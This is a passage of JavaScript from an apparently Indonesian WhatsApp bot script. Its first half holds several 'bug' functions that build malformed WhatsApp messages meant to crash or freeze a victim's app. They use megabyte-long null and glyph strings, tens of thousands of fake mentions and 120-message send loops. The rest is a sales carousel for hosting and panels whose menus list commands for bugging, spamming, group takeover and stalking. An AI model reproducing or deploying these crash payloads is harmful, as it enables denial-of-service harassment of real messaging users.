        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Nvidia.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ SAHRIL VIEWONCE BUG V4" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug6(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "VALORES ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Nvidia.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Nvidia.relayMessage(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  async function PukiMay(target) {
  try {
    let pesan = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: " んすぐに助けてくださいメタシステムさんありがとうございま"
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                name: "galaxy_message",
                title: "null",
                header: " んすぐに助けてくださいメタシステムさんありがとうございま",
                body: ""
              }),
              buttons: []
            },
            contextInfo: {
              mentionedJid: [target],
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    }, {
      quoted: hah
    });
    await Nvidia.relayMessage(target, pesan.message, jids ? {
      participant: {
        jid: target,
        messageId: pesan.key.id
      }
    } : {});
    console.log(chalk.blue(" success send bug "));
    
    // Tambahkan kode iOs Old
    await Nvidia.relayMessage(target, {
      "paymentInviteMessage": {
        serviceType: "FBPAY",
        expiryTimestamp: Date.now() + 1814400000
      }
    }, {
      participant: {
        jid: target
      }
    });
    
    // Tambahkan kode Call Old
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              locationMessage: {},
              hasMediaAttachment: true
            },
            body: {
              text: ""
            },
            nativeFlowMessage: {
              name: "call_permission_request",
              messageParamsJson: ""
            },
            carouselMessage: {}
          }
        }
      }
    }), {
      userJid: target,
      quoted: hah
    });
    await Nvidia.relayMessage(target, etc.message, {
      participant: {
        jid: target
      }
    });
    
    // Tambahkan kode iOs New
    await Nvidia.relayMessage(target, {
      'extendedTextMessage': {
        'text': '.',
        'contextInfo': {
          'stanzaId': target,
          'participant': target,
          'quotedMessage': {
            'conversation': '  バ Nvidia Crashh グ ' + 'ꦾ'.repeat(50000)
          },
          'disappearingMode': {
            'initiator': "CHANGED_IN_CHAT",
            'trigger': "CHAT_SETTING"
          }
        },
        'inviteLinkGroupTypeV2': "DEFAULT"
      }
    }, {
      'participant': {
        'jid': target
      }
    }, {
      'messageId': null
    });
    
    // Tambahkan kode FlowX
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " んすぐに助けてくださいメタシステムさんありがとうございま",
              hasMediaAttachment: false,
            },
            body: {
              text: " んすぐに助けてくださいメタシステムさんありがとうございま",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          }
        }
      }
    }, {});
    await Nvidia.relayMessage(target, msg.message, {
      participant: {
        jid: target
      }
    });
  } catch (error) {
    console.error('Error:', error);
  }
}

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await Nvidia.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await Nvidia.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function Unknown1(Nvidia, isTarget) {
    let memeknya = "ꦾ".repeat(99999) + " ꦽ".repeat(5000);
    var messageContent = generateWAMessageFromContent(
        isTarget,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    stickerPackMessage: {
                        stickerPackId: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0",
                        name: "Bug Made By Nvidia🐉" + memeknya,
                        publisher: memeknya + `ꦾ`.repeat(99999),
                        stickers: [
                            {
                                fileName: "rroK-d0l9EdduolvylB3XF6RKwnyiz0RKAQMWb7RMl4=.webp",
                                isAnimated: false,
                                emojis: [""],
                                accessibilityLabel: "",
                                isLottie: false,
                                mimetype: "image/webp"
                            },
                            {
                                fileName: "JWKop+ILOcOMUNvxzJ52pUKwzWEgMbYkKFlo-aBKcfY=.webp",
                                isAnimated: false,
                                emojis: [""],
                                accessibilityLabel: "",
                                isLottie: false,
                                mimetype: "image/webp"
                            }
                        ],
                        fileLength: "69832",
                        fileSha256: "J1qUbwUO4z77FRY3YcJ2DsQkL+SLTYhvacH2jfcZZNk=",
                        fileEncSha256: "2ZEtY/Lfza1MYM6yU7jvCNwFTsYKHLuU7d6XwX/1W5c=",
                        mediaKey: "A192qGyrnYXtdftrXGS1/R/3qcB6wG46ybFNvuXw0w8=",
                        directPath: "/v/t62.15575-24/27352554_9405543626240762_2450036504553609989_n.enc?ccb=11-4&oh=01_Q5Aa1QFxiY3tujF8LmhWFx_gf4uMfQ2e544QIygRxw6wqt78cw&oe=68406780&_nc_sid=5e03e0",
                        contextInfo: {},
                        mediaKeyTimestamp: "1746459896",
                        trayIconFileName: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0.png",
                        thumbnailDirectPath: "/v/t62.15575-24/11410555_1219244196575326_7771742087005735253_n.enc?ccb=11-4&oh=01_Q5Aa1QEE9w6Kxf3WA3mH-_CcLiRcGVM29PNP1OJ9Z-kwv1mzwg&oe=684036A4&_nc_sid=5e03e0",
                        thumbnailSha256: "UJxXSKrCVS9g/e/Ai39k62XEeTETrof25srXus8fkSA=",
                        thumbnailEncSha256: "ufsZpeTyo10n1OPuYUsqPO01W6/vTrSepULAicGOFi8=",
                        thumbnailHeight: 252,
                        thumbnailWidth: 252,
                        imageDataHash: "M2UxNGQzOGE0NThhM2VmNWFkYTUyZmQ3NzE0MWMwNWZjZjkwODM3NjFjOTY4MDljZjVhOWY0ZWVmZGU3ZWI3YQ==",
                        stickerPackSize: "69233",
                        stickerPackOrigin: "USER_CREATED"
                    },
                },
            },
        }),
        {
            userJid: isTarget,
        }
    );

    for (let i = 0; i < 120; i++) {
        await Nvidia.relayMessage(isTarget, messageContent.message, {
            participant: { jid: isTarget },
            messageId: messageContent.key.id,
        });
        console.log(`Send Bug Blank3 (${i + 1}/120): ${isTarget}`);
    }
}

async function Unknown2(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Bug Made By Nvdiia" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        for (let i = 0; i < 120; i++) {
            await Nvidia.relayMessage(target, messsage, {
                userJid: target,
            });
            console.log(`Send Bug Blank4 (${i + 1}/120): ${target}`);
        }
    } catch (err) {
        console.log(err);
    }
}

async function streamToBuffer(stream) {
  const chunks = []
  for await (const chunk of stream) chunks.push(chunk)
  return Buffer.concat(chunks)
}

async function mentionSw(isTarget) {
    const delaymention = Array.from({
        length: 9741
    }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{
            title: r + 1,
            id: r + 1
        }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Nvidia V9",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: {
                        selectedRowId: "🌀"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 9741
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "🔥 ܻ⨍ꭈׁׅ3᥊ׁׅ݊ꪀׁׅ᥎ׁׅꪱׁׁׁׅׅׅժׁׅ݊ꪱׁׁׁׅׅׅɑׁׅ 🦠ɳσ Ꮳσυ⚡ɳƚҽɾ ⚡"
                        }
                    },
                    description: "🔥🦠 ܻ⨍ꭈׁׅ3᥊ׁׅ݊ꪀׁׅ᥎ׁׅꪱׁׁׁׅׅׅժׁׅ݊ꪱׁׁׁׅׅׅɑׁׅ 🦠ɳσ ⚡Ꮳσυɳƚҽɾ ⚡"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await Nvidia.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: isTarget
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
      
const reply = (teks) => { 
Nvidia.sendMessage(from, { text: teks, contextInfo: { 
externalAdReply : { 
showAdAttribution : true,  
title : "🔥 NvidiaXfr3", 
containsAutoReply : true, 
mediaType : 1, 
thumbnail : fs.readFileSync("./media/thumbnail.jpg"), 
mediaUrl : "https://img102.pixhost.to/images/24/555969613_skyzopedia.jpg", 
sourceUrl : "https://whatsapp.com/channel/0029Vag5c53KAwEk4hnzN220" }}}, { quoted: m }) }

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Nvidia.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*FR3 Hosting* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*FR3 Official Menyediakan 🌟*

* Vps Digital Ocean 2GB - 16GB
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* domain (Request Nama domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup  Bebas Promosi 1 :*
https://chat.whatsapp.com/Lue3cXuHlIfDSccEWKi7AP
* *Channel Testimoni :*
https://whatsapp.com/channel/0029Vb0fOlxEFeXsah2fi31y`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Vps Digital Ocean🌟*

_*Promo Vps Digital Ocean*_
* Ram 2 Core 2 Rp 25.000
* Ram 4 Core 2 Rp 35.000
* Ram 8 Core 4 Rp 45.000
* Ram 16 Core 4 Rp 55.000
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req Domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 25 Hari
>̶>̶ Free Install Thema 8-16 Ram`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Nvidia.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

const menuslide = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Nvidia.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "🌟BERIKUT MENU SLIDE BY FR3 HOSTING🌟"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Store🛍️*

  ┃⭔ .addrespon
  ┃⭔ .delrespon
  ┃⭔ .listrespon
  ┃⭔ .done
  ┃⭔ .proses
  ┃⭔ .jpm
  ┃⭔ .jpm2
  ┃⭔ .jpmtesti
  ┃⭔ .jpmslide
  ┃⭔ .jpmslideht
  ┃⭔ .sendtesti
  ┃⭔ .pushkontak
  ┃⭔ .pushkontak2
  ┃⭔ .payment
  ┃⭔ .produk
  ┃⭔ .subdomain
  ┃⭔ .jpin
  ┃⭔ .listsc
  ┃⭔ .editsc  
  ┃⭔ .addsc
  ┃⭔ .delsc  
  ┃⭔ .addstok
  ┃⭔ .delstok 
  ┃⭔ .setharga
  ┃⭔ .adddo
  ┃⭔ .deldo
  ┃⭔ .promosi
  ┃⭔ .satelit`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Cpanel 1*

  ┃⭔ .addseller
  ┃⭔ .delseller
  ┃⭔ .listseller
  ┃⭔ .addakses
  ┃⭔ .delakses
  ┃⭔ .listakses
  ┃⭔ .1gb
  ┃⭔ .2gb
  ┃⭔ .3gb
  ┃⭔ .4gb
  ┃⭔ .5gb
  ┃⭔ .6gb
  ┃⭔ .7gb
  ┃⭔ .8gb
  ┃⭔ .9gb
  ┃⭔ .10gb
  ┃⭔ .unlimited
  ┃⭔ .cadmin
  ┃⭔ .cpatner
  ┃⭔ .cowner
  ┃⭔ .clearserver
  ┃⭔ .clearuser
  ┃⭔ .clearadmin
  ┃⭔ .deladmin
  ┃⭔ .listpanel
  ┃⭔ .listadmin`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Cpanel 2*

  ┃⭔ .1gb-v2
  ┃⭔ .2gb-v2
  ┃⭔ .3gb-v2
  ┃⭔ .4gb-v2
  ┃⭔ .5gb-v2
  ┃⭔ .6gb-v2
  ┃⭔ .7gb-v2
  ┃⭔ .8gb-v2
  ┃⭔ .9gb-v2
  ┃⭔ .10gb-v2
  ┃⭔ .unlimited-v2
  ┃⭔ .cadmin-v2
  ┃⭔ .delpanel-v2
  ┃⭔ .deladmin-v2
  ┃⭔ .listpanel-v2
  ┃⭔ .listadmin-v2`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Cpanel 3*

  ┃⭔ .1gb-v3
  ┃⭔ .2gb-v3
  ┃⭔ .3gb-v3
  ┃⭔ .4gb-v3
  ┃⭔ .5gb-v3
  ┃⭔ .6gb-v3
  ┃⭔ .7gb-v3
  ┃⭔ .8gb-v3
  ┃⭔ .9gb-v3
  ┃⭔ .10gb-v3
  ┃⭔ .unlimited-v3
  ┃⭔ .cadmin-v3
  ┃⭔ .delpanel-v3
  ┃⭔ .deladmin-v3
  ┃⭔ .listpanel-v3
  ┃⭔ .listadmin-v3`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Cpanel 4*

  ┃⭔ .1gb-v4
  ┃⭔ .2gb-v4
  ┃⭔ .3gb-v4
  ┃⭔ .4gb-v4
  ┃⭔ .5gb-v4
  ┃⭔ .6gb-v4
  ┃⭔ .7gb-v4
  ┃⭔ .8gb-v4
  ┃⭔ .9gb-v4
  ┃⭔ .10gb-v4
  ┃⭔ .unlimited-v4
  ┃⭔ .cadmin-v4
  ┃⭔ .delpanel-v4
  ┃⭔ .deladmin-v4
  ┃⭔ .listpanel-v4
  ┃⭔ .listadmin-v4`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Cpanel 5*

  ┃⭔ .1gb-v5
  ┃⭔ .2gb-v5
  ┃⭔ .3gb-v5
  ┃⭔ .4gb-v5
  ┃⭔ .5gb-v5
  ┃⭔ .6gb-v5
  ┃⭔ .7gb-v5
  ┃⭔ .8gb-v5
  ┃⭔ .9gb-v5
  ┃⭔ .10gb-v5
  ┃⭔ .unlimited-v5
  ┃⭔ .cadmin-v5
  ┃⭔ .delpanel-v5
  ┃⭔ .deladmin-v5
  ┃⭔ .listpanel-v5
  ┃⭔ .listadmin-v5`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Auto Order🛒*

  ┃⭔ .buypanel
  ┃⭔ .buyadp
  ┃⭔ .buyownpanel
  ┃⭔ .buyptpanel
  ┃⭔ .buyvps
  ┃⭔ .buysc
  ┃⭔ .liststok/stok 
  ┃⭔ .buystok
  ┃⭔ .jasainstallpanel 
  ┃⭔ .buydo
  ┃⭔ .buyjasajpm
  ┃⭔ .jasainstalltema
  ┃⭔ .jasahbpanel`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Lainnya 🔧*

  ┃⭔ .updomain
  ┃⭔ .updomain-v2
  ┃⭔ .upapikey
  ┃⭔ .upapikey-v2
  ┃⭔ .upcapikey
  ┃⭔ .upcapikey-v2
  ┃⭔ .addcase
  ┃⭔ .getsv
  ┃⭔ .backup
  ┃⭔ .delcase
  ┃⭔ .createvps 
  ┃⭔ .bratvid
  ┃⭔ .brat
  ┃⭔ .cekidch
  ┃⭔ .cekidgc
  ┃⭔ .qc
  ┃⭔ .readviewonce
  ┃⭔ .stickerwm
  ┃⭔ .sticker
  ┃⭔ .ambilsw
  ┃⭔ .addserverpanel
  ┃⭔ .emojimix
  ┃⭔ .cekpanel
  ┃⭔ .cekhost
  ┃⭔ .githubstalk
  ┃⭔ .str
  ┃⭔ .cekcuaca`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Installer ⚒️*

  ┃⭔ .installmenu
  ┃⭔ .addseller
  ┃⭔ .delseller
  ┃⭔ .listseller
  ┃⭔ .hackbackpanel
  ┃⭔ .installpanel
  ┃⭔ .installtemastellar
  ┃⭔ .installtemabilling
  ┃⭔ .installdepend
  ┃⭔ .installnebula
  ┃⭔ .installtemaelysium
  ┃⭔ .installtemaenigma
  ┃⭔ .installtemanightcore 
  ┃⭔ .uninstallpanel
  ┃⭔ .uninstalltema`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Grub 💬*

  ┃⭔ .add
  ┃⭔ .kick
  ┃⭔ .close
  ┃⭔ .open
  ┃⭔ .hidetag
  ┃⭔ .kudetagc
  ┃⭔ .leave
  ┃⭔ .tagall
  ┃⭔ .promote
  ┃⭔ .demote
  ┃⭔ .resetlinkgc
  ┃⭔ .on
  ┃⭔ .off
  ┃⭔ .linkgc
  ┃⭔ .spamchat
  ┃⭔ .closetime
  ┃⭔ .opentime
  ┃⭔ .tagrandom`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*🗡️BUG MENU🗡️*

  ┃⭔ .bugmenu`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Menu Have Fun 🚀*

  ┃⭔ .yts
  ┃⭔ .apkmod
  ┃⭔ .pinterest
  ┃⭔ .ffstalk
  ┃⭔ .mlstalk
  ┃⭔ .artinama
  ┃⭔ .cekgempa
  ┃⭔ .ai
  ┃⭔ .gpt
  ┃⭔ .tourl
  ┃⭔ .tourl2
  ┃⭔ .ssweb
  ┃⭔ .translate
  ┃⭔ .tohd
  ┃⭔ .shortlink
  ┃⭔ .shortlink2
  ┃⭔ .enc
  ┃⭔ .cetakqr
  ┃⭔ .playspotify 
  ┃⭔ .toaudio
  ┃⭔ .tiktok
  ┃⭔ .tiktokmp3
  ┃⭔ .instagram
  ┃⭔ .ytmp3
  ┃⭔ .ytmp4
  ┃⭔ .play
  ┃⭔ .playvid
  ┃⭔ .gitclone
  ┃⭔ .mediafire
  ┃⭔ .nulis
  ┃⭔ .npm
  ┃⭔ .xnxxs
  ┃⭔ .videy
  ┃⭔ .cekipvps
  ┃⭔ . jadwalsholat
  ┃⭔ .toimg
  ┃⭔ .ai
  ┃⭔ .gpt
  ┃⭔ .tourl
  ┃⭔ .tourl2
  ┃⭔ .ssweb
  ┃⭔ .translate
  ┃⭔ .tohd
  ┃⭔ .shortlink
  ┃⭔ .shortlink2
  ┃⭔ .enc
  ┃⭔ .cetakqr
  ┃⭔ .nulis
  ┃⭔ .npm
  ┃⭔ .carinomor
  ┃⭔ .toimg
  ┃⭔ .a2f
  ┃⭔ .-a2fqr
  ┃⭔ .encjawa
  ┃⭔ .getpp
  ┃⭔ .cekid
  ┃⭔ .cekgrub
  ┃⭔ .addplugins
  ┃⭔ .delplugis
  ┃⭔ .listplugins`, 
hasMediaAttachment: true,
...imgsc
}),
